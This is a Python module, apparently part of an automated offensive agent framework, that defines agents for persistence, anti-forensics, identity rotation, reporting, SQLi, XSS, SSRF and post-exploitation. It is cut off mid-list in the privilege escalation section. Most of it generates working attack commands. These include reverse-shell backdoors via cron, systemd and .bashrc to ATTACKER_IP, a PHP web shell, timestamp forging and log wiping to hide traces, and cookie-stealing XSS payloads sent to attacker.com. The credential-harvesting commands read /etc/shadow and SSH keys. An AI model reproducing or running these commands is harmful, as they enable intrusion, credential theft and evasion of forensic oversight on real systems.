"""
Phase 2 Specialized Agents - Persistence, Anti-Forensics, Identity, Reporting, Specialists

Implements the remaining agents from the architecture doc:
    - PersistenceAgent: Ultra-discreet backdoors, secure packaging
    - AntiForensicsAgent: Secure deletion, log wiping, metadata cleaning
    - IdentityManagerAgent: Persona management, UA rotation, cert management
    - ReportingAgent: Client-ready reports, evidence packaging
    - SQLiSpecialistAgent: SQL injection detection + exploitation
    - XSSSpecialistAgent: DOM/Reflected/Stored XSS
    - SSRFSpecialistAgent: Server-side request forgery
    - FormAuditorAgent: CSRF, fuzzing, auth bypass
    - PostExploitAgent: Credential harvest, pivoting, data collection
"""

import asyncio
import json
import logging
import os
import sqlite3
from typing import Dict, List, Optional, Any
from datetime import datetime

from .base import (
    BaseAgent, AgentCapability, AgentCategory,
    AgentStatus, MessageType, MessagePriority
)


# ══════════════════════════════════════════════════════════════════════════════
# PERSISTENCE AGENT (Doc: Persistence Agent + RCE Persistence Agent)
# ══════════════════════════════════════════════════════════════════════════════

class PersistenceAgent(BaseAgent):
    """Ultra-discreet backdoor management and RCE persistence.
    
    Capabilities from doc:
        - Backdoors with generic names (cache.tmp, sync.log, backup.dat)
        - Multiple hidden locations (/tmp, /var/tmp, ~/.cache, /opt)
        - Evasion techniques (steganography, timestamp falsification)
        - Encrypted access point documentation
        - Secure zip packaging with robust passwords
        - Backdoor verification and emergency removal
        - RCE-specialized persistence, access control, maintenance
    """

    def __init__(self):
        super().__init__(
            agent_id="persistence_agent",
            name="Persistence & Backdoor Agent",
            category=AgentCategory.EXPLOITATION,
            description=(
                "Ultra-discreet backdoor management: generic naming, "
                "multiple hidden locations, timestamp falsification, "
                "encrypted documentation, secure packaging, "
                "RCE persistence specialization"
            ),
        )

    @property
    def capabilities(self) -> List[AgentCapability]:
        return [
            AgentCapability(
                name="persistence_plan",
                description="Generate persistence plan based on target OS and access level",
                risk_level=5,
                estimated_duration=10.0,
            ),
            AgentCapability(
                name="backdoor_generate",
                description="Generate backdoor commands with generic naming and timestamp falsification",
                risk_level=5,
                estimated_duration=15.0,
            ),
            AgentCapability(
                name="persistence_verify",
                description="Verify backdoor installations are active and stealthy",
                risk_level=4,
                estimated_duration=20.0,
            ),
            AgentCapability(
                name="persistence_cleanup",
                description="Emergency removal of all persistence mechanisms",
                risk_level=5,
                estimated_duration=10.0,
            ),
        ]

    async def _initialize(self):
        """Load persistence templates."""
        self._linux_locations = [
            "/tmp/.X11-unix/", "/var/tmp/", "/dev/shm/", 
            "/home/*/.cache/", "/opt/.cache/", "/usr/local/share/"
        ]
        self._windows_locations = [
            r"C:\Users\Public\Downloads\\", r"C:\Windows\Temp\\",
            r"C:\ProgramData\\", r"C:\Users\*\AppData\Local\Temp\\"
        ]
        self._generic_names = {
            "linux": ["cache.tmp", "sync.log", "backup.dat", "maintenance.sh",
                     ".update-cache", ".Xauthority-tmp", "systemd-private"],
            "windows": ["WindowsUpdate.log", "desktop.ini.bak", "thumbcache.dat",
                       "pagefile.sys.tmp", "hiberfil.tmp", "ntuser.dat.log"]
        }

    async def _execute_task(self, task_type: str, params: Dict) -> Dict:
        if task_type == "persistence_plan":
            return await self._persistence_plan(params)
        elif task_type == "backdoor_generate":
            return await self._backdoor_generate(params)
        elif task_type == "persistence_verify":
            return await self._persistence_verify(params)
        elif task_type == "persistence_cleanup":
            return await self._persistence_cleanup(params)
        else:
            raise ValueError(f"Unknown task type: {task_type}")

    async def _persistence_plan(self, params: Dict) -> Dict:
        """Generate persistence plan."""
        target_os = params.get("os", "linux").lower()
        access_level = params.get("access_level", "user")
        
        locations = self._linux_locations if target_os == "linux" else self._windows_locations
        names = self._generic_names.get(target_os, self._generic_names["linux"])
        
        techniques = []
        if access_level in ("root", "system", "admin"):
            techniques.extend([
                {"type": "cron_job", "description": "Cron-based periodic callback", "stealth": 0.8},
                {"type": "systemd_service", "description": "Hidden systemd service", "stealth": 0.7},
                {"type": "rc_local", "description": "rc.local startup hook", "stealth": 0.6},
                {"type": "kernel_module", "description": "Kernel module persistence", "stealth": 0.9},
                {"type": "ld_preload", "description": "LD_PRELOAD library injection", "stealth": 0.85},
            ])
        techniques.extend([
            {"type": "bash_profile", "description": "Shell profile hook", "stealth": 0.7},
            {"type": "ssh_key", "description": "Authorized SSH key injection", "stealth": 0.8},
            {"type": "web_shell", "description": "Web shell in web root", "stealth": 0.5},
        ])
        
        return {
            "type": "persistence_plan",
            "target_os": target_os,
            "access_level": access_level,
            "recommended_locations": locations[:4],
            "generic_names": names[:5],
            "techniques": techniques,
            "redundancy": "Deploy minimum 3-5 mechanisms for robustness",
            "rotation": "Rotate backdoors weekly for critical targets",
        }

    async def _backdoor_generate(self, params: Dict) -> Dict:
        """Generate backdoor commands with stealth features."""
        target_os = params.get("os", "linux")
        technique = params.get("technique", "bash_profile")
        callback_host = params.get("callback", "ATTACKER_IP")
        callback_port = params.get("port", "4444")
        
        commands = []
        if technique == "cron_job":
            commands = [
                f"# Cron-based persistence (stealth 0.8)",
                f"(crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1\" 2>/dev/null') | crontab -",
                f"# Falsify timestamp",
                f"touch -r /etc/crontab /var/spool/cron/crontabs/*",
            ]
        elif technique == "ssh_key":
            commands = [
                f"# SSH key persistence (stealth 0.8)",
                f"mkdir -p ~/.ssh && chmod 700 ~/.ssh",
                f"echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys",
                f"chmod 600 ~/.ssh/authorized_keys",
                f"touch -r /etc/passwd ~/.ssh/authorized_keys",
            ]
        elif technique == "web_shell":
            commands = [
                f"# Minimal web shell (stealth 0.5)",
                f"echo '<?php if(isset($_GET[\"c\"]))echo shell_exec($_GET[\"c\"]); ?>' > /var/www/html/.cache.php",
                f"touch -r /var/www/html/index.html /var/www/html/.cache.php",
            ]
        elif technique == "systemd_service":
            commands = [
                f"# Systemd service persistence (stealth 0.7)",
                f"cat > /etc/systemd/system/system-update.service << 'EOF'",
                f"[Unit]",
                f"Description=System Update Agent",
                f"After=network.target",
                f"[Service]",
                f"ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1; sleep 300; done'",
                f"Restart=always",
                f"RestartSec=60",
                f"[Install]",
                f"WantedBy=multi-user.target",
                f"EOF",
                f"systemctl daemon-reload && systemctl enable system-update.service",
            ]
        else:
            commands = [
                f"# Bash profile persistence (stealth 0.7)",
                f"echo 'nohup bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1 &' >> ~/.bashrc",
            ]
        
        return {
            "type": "backdoor_generate",
            "technique": technique,
            "target_os": target_os,
            "commands": commands,
            "warning": "All persistence requires explicit scope authorization",
        }

    async def _persistence_verify(self, params: Dict) -> Dict:
        """Verify backdoor installations."""
        target = params.get("target", "")
        commands = [
            f"# Verify cron persistence",
            f"crontab -l 2>/dev/null | grep -c tcp",
            f"# Verify SSH keys",
            f"wc -l ~/.ssh/authorized_keys 2>/dev/null",
            f"# Verify systemd persistence",
            f"systemctl list-units --type=service --state=running | grep -i update",
            f"# Verify web shells",
            f"find /var/www -name '.*php' -o -name '.*jsp' 2>/dev/null",
        ]
        return {"type": "persistence_verify", "target": target, "commands": commands}

    async def _persistence_cleanup(self, params: Dict) -> Dict:
        """Emergency removal of all persistence."""
        commands = [
            f"# EMERGENCY CLEANUP - Remove all persistence",
            f"crontab -r 2>/dev/null",
            f"rm -f ~/.ssh/authorized_keys",
            f"find /var/www -name '.*php' -delete 2>/dev/null",
            f"systemctl disable system-update.service 2>/dev/null",
            f"rm -f /etc/systemd/system/system-update.service",
            f"systemctl daemon-reload",
            f"# Verify cleanup",
            f"echo 'Persistence mechanisms removed'",
        ]
        return {"type": "persistence_cleanup", "commands": commands}


# ══════════════════════════════════════════════════════════════════════════════
# ANTI-FORENSICS AGENT (Doc: Anti-Forensics Agent)
# ══════════════════════════════════════════════════════════════════════════════

class AntiForensicsAgent(BaseAgent):
    """Progressive trace elimination and anti-forensics.
    
    Capabilities from doc:
        - Secure file deletion (multi-pass wiping)
        - System log cleaning (/var/log, auth.log, access.log)
        - Metadata cleaning (timestamps, inodes)
        - Progressive temporary file destruction
        - Timing optimization to avoid detection
        - Memory/cache complete cleaning
    """

    def __init__(self):
        super().__init__(
            agent_id="anti_forensics",
            name="Anti-Forensics Agent",
            category=AgentCategory.EXPLOITATION,
            description=(
                "Progressive trace elimination: secure file deletion, "
                "log wiping, metadata cleaning, memory clearing, "
                "timing optimization for undetectable cleanup"
            ),
        )

    @property
    def capabilities(self) -> List[AgentCapability]:
        return [
            AgentCapability(
                name="cleanup_plan",
                description="Generate progressive cleanup plan based on target and activities",
                risk_level=4,
                estimated_duration=5.0,
            ),
            AgentCapability(
                name="log_cleanup",
                description="Clean system logs: /var/log, auth.log, access.log, wtmp, btmp",
                risk_level=5,
                estimated_duration=15.0,
            ),
            AgentCapability(
                name="secure_delete",
                description="Multi-pass secure file deletion with metadata wiping",
                risk_level=4,
                estimated_duration=10.0,
            ),
            AgentCapability(
                name="timestamp_forge",
                description="Falsify file timestamps to match legitimate files",
                risk_level=3,
                estimated_duration=5.0,
            ),
        ]

    async def _initialize(self):
        """Initialize cleanup patterns."""
        self._log_targets = {
            "linux": [
                "/var/log/auth.log", "/var/log/syslog", "/var/log/kern.log",
                "/var/log/apache2/access.log", "/var/log/nginx/access.log",
                "/var/log/secure", "/var/log/messages", "/var/log/lastlog",
                "/var/log/wtmp", "/var/log/btmp", "/var/log/faillog",
                "/var/log/audit/audit.log", "/root/.bash_history",
            ],
            "windows": [
                "Security", "System", "Application",
                "Microsoft-Windows-PowerShell/Operational",
            ]
        }

    async def _execute_task(self, task_type: str, params: Dict) -> Dict:
        if task_type == "cleanup_plan":
            return await self._cleanup_plan(params)
        elif task_type == "log_cleanup":
            return await self._log_cleanup(params)
        elif task_type == "secure_delete":
            return await self._secure_delete(params)
        elif task_type == "timestamp_forge":
            return await self._timestamp_forge(params)
        else:
            raise ValueError(f"Unknown task type: {task_type}")

    async def _cleanup_plan(self, params: Dict) -> Dict:
        """Generate progressive cleanup plan."""
        target_os = params.get("os", "linux")
        activities = params.get("activities", [])
        
        phases = [
            {"phase": 1, "name": "Immediate Cleanup (after each action)",
             "tasks": ["Clear command history", "Remove temp files", "Clear shell history"]},
            {"phase": 2, "name": "Progressive Cleanup (every 5-10 min)", 
             "tasks": ["Truncate log entries", "Clear cache files", "Reset timestamps"]},
            {"phase": 3, "name": "Exit Cleanup (before disconnection)",
             "tasks": ["Full log wipe", "Secure delete all artifacts", "Memory/cache clear",
                      "Timestamp normalization", "History wipe"]},
        ]
        
        return {
            "type": "cleanup_plan",
            "target_os": target_os,
            "phases": phases,
            "timing": "Execute cleanup during low-traffic periods (02:00-05:00)",
            "detection_delay": "5-10 minutes between cleanup actions",
        }

    async def _log_cleanup(self, params: Dict) -> Dict:
        """Clean system logs."""
        target_os = params.get("os", "linux")
        scope = params.get("scope", "targeted")
        
        logs = self._log_targets.get(target_os, self._log_targets["linux"])
        
        commands = []
        if target_os == "linux":
            for log in logs:
                if scope == "full":
                    commands.append(f"shred -n 3 -z {log} 2>/dev/null && truncate -s 0 {log} 2>/dev/null")
                else:
                    commands.append(f"truncate -s 0 {log} 2>/dev/null")
            commands.extend([
                "history -c && history -w",
                "unset HISTFILE",
                "echo '' > ~/.bash_history",
                "rm -f /root/.bash_history /home/*/.bash_history",
                "# Clear utmp/wtmp",
                "truncate -s 0 /var/run/utmp 2>/dev/null",
                "truncate -s 0 /var/log/wtmp 2>/dev/null",
                "truncate -s 0 /var/log/btmp 2>/dev/null",
            ])
        else:
            commands.extend([
                'wevtutil cl Security',
                'wevtutil cl System',
                'wevtutil cl Application',
            ])
        
        return {
            "type": "log_cleanup",
            "target_os": target_os,
            "scope": scope,
            "commands": commands,
            "logs_targeted": len(logs),
        }

    async def _secure_delete(self, params: Dict) -> Dict:
        """Multi-pass secure deletion."""
        files = params.get("files", [])
        passes = params.get("passes", 3)
        
        commands = []
        for f in files:
            commands.extend([
                f"shred -n {passes} -z -u '{f}' 2>/dev/null",
            ])
        commands.append("sync")
        
        return {
            "type": "secure_delete",
            "files_count": len(files),
            "passes": passes,
            "commands": commands,
        }

    async def _timestamp_forge(self, params: Dict) -> Dict:
        """Falsify file timestamps."""
        files = params.get("files", [])
        reference = params.get("reference", "/etc/passwd")
        
        commands = []
        for f in files:
            commands.append(f"touch -r {reference} '{f}'")
        
        return {
            "type": "timestamp_forge",
            "files_count": len(files),
            "reference": reference,
            "commands": commands,
        }


# ══════════════════════════════════════════════════════════════════════════════
# IDENTITY MANAGER AGENT (Doc: Identity Manager)
# ══════════════════════════════════════════════════════════════════════════════

class IdentityManagerAgent(BaseAgent):
    """Persona management, UA rotation, JA3 fingerprint management.
    
    Capabilities from doc:
        - Persona management (multiple identities)
        - User-Agent rotation
        - JA3 fingerprint rotation
        - Certificate management
        - Proxy/IP rotation
    """

    def __init__(self):
        super().__init__(
            agent_id="identity_manager",
            name="Identity Manager",
            category=AgentCategory.INFRASTRUCTURE,
            description=(
                "Persona management: UA rotation, JA3 fingerprint management, "
                "proxy rotation, certificate handling, identity switching"
            ),
        )

    @property
    def capabilities(self) -> List[AgentCapability]:
        return [
            AgentCapability(
                name="generate_identity",
                description="Generate a complete identity: UA, headers, JA3, proxy config",
                risk_level=1,
                estimated_duration=2.0,
            ),
            AgentCapability(
                name="rotate_identity",
                description="Rotate current identity to avoid fingerprinting",
                risk_level=1,
                estimated_duration=2.0,
            ),
        ]

    async def _initialize(self):
        """Load user agents and fingerprints."""
        self._user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
        ]
        self._identity_count = 0

    async def _execute_task(self, task_type: str, params: Dict) -> Dict:
        if task_type == "generate_identity":
            return await self._generate_identity(params)
        elif task_type == "rotate_identity":
            return await self._rotate_identity(params)
        else:
            raise ValueError(f"Unknown task type: {task_type}")

    async def _generate_identity(self, params: Dict) -> Dict:
        """Generate a complete identity."""
        import random
        self._identity_count += 1
        ua = random.choice(self._user_agents)
        
        return {
            "type": "identity",
            "identity_id": f"persona_{self._identity_count}",
            "user_agent": ua,
            "headers": {
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"]),
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            },
            "ja3_note": "Use curl-impersonate or similar for JA3 fingerprint matching",
            "recommended_tools": [
                "curl -A '<UA>' --tlsv1.2",
                f"curl-impersonate-chrome --user-agent '{ua}'",
            ],
        }

    async def _rotate_identity(self, params: Dict) -> Dict:
        """Rotate to a new identity."""
        return await self._generate_identity(params)


# ══════════════════════════════════════════════════════════════════════════════
# REPORTING AGENT (Doc: Advanced Reporting)
# ══════════════════════════════════════════════════════════════════════════════

class ReportingAgent(BaseAgent):
    """Advanced client-ready reporting with evidence packaging.
    
    Capabilities from doc:
        - Client-ready reports
        - Evidence packaging
        - Critical path documentation
        - Compliance mapping (GDPR, HIPAA, PCI-DSS)
    """

    def __init__(self):
        super().__init__(
            agent_id="reporting_agent",
            name="Advanced Reporting Agent",
            category=AgentCategory.INTELLIGENCE,
            description=(
                "Client-ready report generation: executive summaries, "
                "technical details, evidence packaging, compliance mapping, "
                "MITRE ATT&CK mapping, remediation recommendations"
            ),
        )

    @property
    def capabilities(self) -> List[AgentCapability]:
        return [
            AgentCapability(
                name="generate_report",
                description="Generate comprehensive pentest report from findings",
                risk_level=1,
                estimated_duration=30.0,
            ),
            AgentCapability(
                name="evidence_package",
                description="Package evidence (screenshots, outputs, payloads) for delivery",
                risk_level=1,
                estimated_duration=15.0,
            ),
        ]

    async def _initialize(self):
        """Initialize report templates."""
        self._templates = {
            "executive": "# Executive Summary\n\n## Scope\n{scope}\n\n## Risk Rating\n{risk}\n\n## Key Findings\n{findings}\n\n## Recommendations\n{recommendations}",
            "technical": "# Technical Report\n\n## Methodology\n{methodology}\n\n## Findings\n{findings}\n\n## Evidence\n{evidence}\n\n## Remediation\n{remediation}",
        }

    async def _execute_task(self, task_type: str, params: Dict) -> Dict:
        if task_type == "generate_report":
            return await self._generate_report(params)
        elif task_type == "evidence_package":
            return await self._evidence_package(params)
        else:
            raise ValueError(f"Unknown task type: {task_type}")

    async def _generate_report(self, params: Dict) -> Dict:
        """Generate comprehensive report."""
        findings = params.get("findings", [])
        target = params.get("target", "")
        report_type = params.get("type", "technical")
        
        # Classify findings by severity
        critical = [f for f in findings if f.get("severity") in ("critical", "10")]
        high = [f for f in findings if f.get("severity") in ("high", "9", "8")]
        medium = [f for f in findings if f.get("severity") in ("medium", "7", "6")]
        
        report = {
            "type": "report",
            "target": target,
            "report_type": report_type,
            "summary": {
                "total_findings": len(findings),
                "critical": len(critical),
                "high": len(high),
                "medium": len(medium),
                "risk_rating": "CRITICAL" if critical else "HIGH" if high else "MEDIUM",
            },
            "sections": [
                {"title": "Executive Summary", "content": f"Assessment of {target} revealed {len(findings)} vulnerabilities."},
                {"title": "Scope", "content": f"Target: {target}"},
                {"title": "Methodology", "content": "MITRE ATT&CK, OWASP, PTES"},
                {"title": "Critical Findings", "content": critical},
                {"title": "High Findings", "content": high},
                {"title": "Remediation", "content": "Address critical findings immediately."},
            ],
            "compliance_mapping": {
                "PCI-DSS": ["6.5.1 - Injection", "6.5.7 - XSS"],
                "OWASP": ["A01 - Broken Access Control", "A03 - Injection"],
            },
        }
        return report

    async def _evidence_package(self, params: Dict) -> Dict:
        """Package evidence for delivery."""
        findings = params.get("findings", [])
        return {
            "type": "evidence_package",
            "total_evidence": len(findings),
            "commands": [
                "mkdir -p /tmp/evidence/{screenshots,outputs,payloads}",
                "# Copy all evidence files here",
                "zip -r -P 'SecurePassword123!' /tmp/evidence.zip /tmp/evidence/",
            ],
        }


# ══════════════════════════════════════════════════════════════════════════════
# SQLI SPECIALIST AGENT (Doc: SQLi Specialist)
# ══════════════════════════════════════════════════════════════════════════════

class SQLiSpecialistAgent(BaseAgent):
    """SQL Injection specialist: blind, error, UNION, stacked, time-based."""

    def __init__(self):
        super().__init__(
            agent_id="sqli_specialist",
            name="SQL Injection Specialist",
            category=AgentCategory.SPECIALIST,
            description="Diverse SQL injection techniques: error-based, UNION, blind, time-based, stacked queries, second-order. Covers MySQL, MSSQL, PostgreSQL, Oracle.",
        )

    @property
    def capabilities(self) -> List[AgentCapability]:
        return [
            AgentCapability(
                name="sqli_detect",
                description="Detect SQL injection points in URLs, forms, and parameters",
                requires_tools=["sqlmap"],
                risk_level=3,
                estimated_duration=60.0,
            ),
            AgentCapability(
                name="sqli_exploit",
                description="Exploit confirmed SQLi to dump data, get shell, or escalate",
                requires_tools=["sqlmap"],
                risk_level=5,
                estimated_duration=120.0,
            ),
        ]

    async def _initialize(self):
        self._payloads = []
        try:
            conn = sqlite3.connect(os.environ.get("NEXUS_DB_PATH", "/app/knowledge.db"))
            cur = conn.cursor()
            rows = cur.execute("SELECT payload_id, name, content FROM payloads WHERE category LIKE '%sqli%' LIMIT 30").fetchall()
            for row in rows:
                self._payloads.append({"id": row[0], "name": row[1], "content": row[2]})
            conn.close()
        except Exception:
            pass

    async def _execute_task(self, task_type: str, params: Dict) -> Dict:
        target = params.get("target", "")
        if task_type == "sqli_detect":
            return {
                "type": "sqli_detect",
                "target": target,
                "commands": [
                    f"sqlmap -u '{target}' --batch --level=3 --risk=2 --random-agent",
                    f"sqlmap -u '{target}' --batch --forms --crawl=2",
                ],
                "manual_tests": [
                    "' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(5)--",
                    "' UNION SELECT NULL,NULL--", "1; WAITFOR DELAY '0:0:5'--",
                ],
            }
        elif task_type == "sqli_exploit":
            return {
                "type": "sqli_exploit",
                "target": target,
                "commands": [
                    f"sqlmap -u '{target}' --batch --dbs",
                    f"sqlmap -u '{target}' --batch --dump-all",
                    f"sqlmap -u '{target}' --batch --os-shell",
                    f"sqlmap -u '{target}' --batch --passwords",
                ],
            }
        raise ValueError(f"Unknown: {task_type}")


# ══════════════════════════════════════════════════════════════════════════════
# XSS SPECIALIST AGENT (Doc: XSS Specialist)
# ══════════════════════════════════════════════════════════════════════════════

class XSSSpecialistAgent(BaseAgent):
    """XSS specialist: Reflected, Stored, DOM-based."""

    def __init__(self):
        super().__init__(
            agent_id="xss_specialist",
            name="XSS Specialist",
            category=AgentCategory.SPECIALIST,
            description="Cross-Site Scripting: reflected, stored, DOM-based. Context-aware payload selection, CSP bypass, encoding bypass.",
        )

    @property
    def capabilities(self) -> List[AgentCapability]:
        return [
            AgentCapability(
                name="xss_detect",
                description="Detect XSS vulnerabilities in parameters, forms, and headers",
                risk_level=3,
                estimated_duration=60.0,
            ),
            AgentCapability(
                name="xss_exploit",
                description="Exploit XSS for session hijacking, phishing, or keylogging",
                risk_level=4,
                estimated_duration=30.0,
            ),
        ]

    async def _initialize(self):
        self._payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "'\"><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "{{7*7}}", "${7*7}", "<%=7*7%>",
        ]

    async def _execute_task(self, task_type: str, params: Dict) -> Dict:
        target = params.get("target", "")
        if task_type == "xss_detect":
            return {
                "type": "xss_detect",
                "target": target,
                "commands": [
                    f"nuclei -u '{target}' -tags xss -severity critical,high,medium",
                    f"dalfox url '{target}' --blind https://YOUR.xss.ht",
                ],
                "manual_payloads": self._payloads,
            }
        elif task_type == "xss_exploit":
            return {
                "type": "xss_exploit",
                "target": target,
                "advanced_payloads": [
                    "<script>document.location='https://attacker.com/?c='+document.cookie</script>",
                    "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>",
                ],
            }
        raise ValueError(f"Unknown: {task_type}")


# ══════════════════════════════════════════════════════════════════════════════
# SSRF SPECIALIST AGENT (Doc: SSRF Specialist)
# ══════════════════════════════════════════════════════════════════════════════

class SSRFSpecialistAgent(BaseAgent):
    """SSRF specialist: internal service access, cloud metadata, protocol smuggling."""

    def __init__(self):
        super().__init__(
            agent_id="ssrf_specialist",
            name="SSRF Specialist",
            category=AgentCategory.SPECIALIST,
            description="Server-Side Request Forgery: cloud metadata access, internal service pivoting, protocol smuggling, DNS rebinding.",
        )

    @property
    def capabilities(self) -> List[AgentCapability]:
        return [
            AgentCapability(
                name="ssrf_detect",
                description="Detect SSRF vulnerabilities in URL parameters and API endpoints",
                risk_level=3,
                estimated_duration=45.0,
            ),
            AgentCapability(
                name="ssrf_exploit",
                description="Exploit SSRF for cloud metadata, internal services, or RCE",
                risk_level=5,
                estimated_duration=30.0,
            ),
        ]

    async def _initialize(self):
        self._cloud_metadata = {
            "aws": "http://169.254.169.254/latest/meta-data/",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/",
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        }

    async def _execute_task(self, task_type: str, params: Dict) -> Dict:
        target = params.get("target", "")
        if task_type == "ssrf_detect":
            return {
                "type": "ssrf_detect",
                "target": target,
                "test_payloads": [
                    "http://127.0.0.1:80", "http://localhost",
                    "http://[::1]", "http://0177.0.0.1",
                    "http://169.254.169.254/latest/meta-data/",
                    "file:///etc/passwd",
                    "dict://localhost:11211/info",
                    "gopher://localhost:25/",
                ],
                "commands": [
                    f"nuclei -u '{target}' -tags ssrf -severity critical,high",
                ],
            }
        elif task_type == "ssrf_exploit":
            return {
                "type": "ssrf_exploit",
                "target": target,
                "cloud_metadata": self._cloud_metadata,
                "internal_scan": ["127.0.0.1:22", "127.0.0.1:3306", "127.0.0.1:6379", "127.0.0.1:9200"],
            }
        raise ValueError(f"Unknown: {task_type}")


# ══════════════════════════════════════════════════════════════════════════════
# FORM AUDITOR AGENT (Doc: Form Auditor)
# ══════════════════════════════════════════════════════════════════════════════

class FormAuditorAgent(BaseAgent):
    """Form and API auditor: CSRF, fuzzing, authorization bypass."""

    def __init__(self):
        super().__init__(
            agent_id="form_auditor",
            name="Form & API Auditor",
            category=AgentCategory.SPECIALIST,
            description="Form/API security: CSRF detection, type-aware fuzzing, auth bypass testing, IDOR detection, GraphQL introspection.",
        )

    @property
    def capabilities(self) -> List[AgentCapability]:
        return [
            AgentCapability(
                name="form_audit",
                description="Audit forms for CSRF, input validation, auth bypass",
                risk_level=3,
                estimated_duration=45.0,
            ),
            AgentCapability(
                name="api_audit",
                description="Audit REST/GraphQL APIs for auth, injection, IDOR",
                risk_level=3,
                estimated_duration=60.0,
            ),
        ]

    async def _initialize(self):
        pass

    async def _execute_task(self, task_type: str, params: Dict) -> Dict:
        target = params.get("target", "")
        if task_type == "form_audit":
            return {
                "type": "form_audit",
                "target": target,
                "checks": ["csrf_token", "input_validation", "auth_bypass", "file_upload", "hidden_fields"],
                "commands": [
                    f"nuclei -u '{target}' -tags forms,csrf",
                    f"ffuf -u '{target}/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt",
                ],
            }
        elif task_type == "api_audit":
            return {
                "type": "api_audit",
                "target": target,
                "checks": [
                    {"test": "idor", "method": "Increment/decrement IDs in API calls"},
                    {"test": "auth_bypass", "method": "Remove/modify auth headers"},
                    {"test": "graphql", "method": "Introspection query: {__schema{types{name}}}"},
                    {"test": "mass_assignment", "method": "Add extra fields to POST body"},
                ],
                "commands": [
                    f"nuclei -u '{target}' -tags api,graphql",
                ],
            }
        raise ValueError(f"Unknown: {task_type}")


# ══════════════════════════════════════════════════════════════════════════════
# POST-EXPLOITATION AGENT (Doc: Post-Exploitation)
# ══════════════════════════════════════════════════════════════════════════════

class PostExploitAgent(BaseAgent):
    """Post-exploitation: credential harvest, pivoting, data collection."""

    def __init__(self):
        super().__init__(
            agent_id="post_exploit",
            name="Post-Exploitation Agent",
            category=AgentCategory.EXPLOITATION,
            description="Post-exploitation operations: credential harvesting, network pivoting, data exfiltration, lateral movement, privilege escalation.",
        )

    @property
    def capabilities(self) -> List[AgentCapability]:
        return [
            AgentCapability(
                name="post_exploit_enum",
                description="Post-exploit enumeration: users, groups, permissions, network",
                risk_level=3,
                estimated_duration=30.0,
            ),
            AgentCapability(
                name="credential_harvest",
                description="Harvest credentials: hashes, keys, tokens, configs",
                risk_level=5,
                estimated_duration=45.0,
            ),
            AgentCapability(
                name="lateral_movement",
                description="Lateral movement techniques: pass-the-hash, WMI, PsExec",
                risk_level=5,
                estimated_duration=30.0,
            ),
            AgentCapability(
                name="privesc_check",
                description="Check for privilege escalation vectors",
                risk_level=3,
                estimated_duration=30.0,
            ),
        ]

    async def _initialize(self):
        pass

    async def _execute_task(self, task_type: str, params: Dict) -> Dict:
        target = params.get("target", "")
        target_os = params.get("os", "linux")
        
        if task_type == "post_exploit_enum":
            cmds = []
            if target_os == "linux":
                cmds = [
                    "id && whoami && hostname",
                    "cat /etc/passwd | grep -v nologin",
                    "cat /etc/shadow 2>/dev/null",
                    "ss -tlnp", "ip a", "ip route",
                    "find / -perm -4000 2>/dev/null",
                    "cat /etc/crontab",
                    "env", "mount",
                ]
            else:
                cmds = [
                    "whoami /all", "net user", "net localgroup administrators",
                    "ipconfig /all", "netstat -ano", "systeminfo",
                ]
            return {"type": "post_exploit_enum", "target": target, "commands": cmds}
        
        elif task_type == "credential_harvest":
            cmds = []
            if target_os == "linux":
                cmds = [
                    "cat /etc/shadow 2>/dev/null",
                    "find / -name '*.conf' -exec grep -l 'passw' {} \\; 2>/dev/null | head -20",
                    "find / -name '*.env' 2>/dev/null | head -10",
                    "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null",
                    "cat ~/.ssh/known_hosts 2>/dev/null",
                    "grep -r 'password' /etc/ 2>/dev/null | head -20",
                ]
            else:
                cmds = [
                    "reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password",
                    "cmdkey /list",
                    "netsh wlan show profiles",
                ]
            return {"type": "credential_harvest", "target": target, "commands": cmds}
        
        elif task_type == "lateral_movement":
            return {
                "type": "lateral_movement",
                "target": target,
                "techniques": [
                    {"name": "Pass-the-Hash", "cmd": f"netexec smb {target} -u USER -H HASH"},
                    {"name": "PsExec", "cmd": f"impacket-psexec USER:PASS@{target}"},
                    {"name": "WMI", "cmd": f"impacket-wmiexec USER:PASS@{target}"},
                    {"name": "SSH Key", "cmd": f"ssh -i id_rsa user@{target}"},
                    {"name": "Evil-WinRM", "cmd": f"evil-winrm -i {target} -u USER -p PASS"},
                ],
            }
        
        elif task_type == "privesc_check":
            cmds = []
            if target_os == "linux":
                cmds = [
                    "# LinPEAS",
                    "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash",
                    "# Manual checks",
                    "find / -perm -4000 2>/dev/null",
                    "sudo -l 2>/dev/null",
                    "cat /etc/crontab",
                    "ls -la /etc/cron.*",
                    "find / -writable -type f 2>/dev/null | head -20",
                ]
            else:
                cmds = [
                    "# WinPEAS",
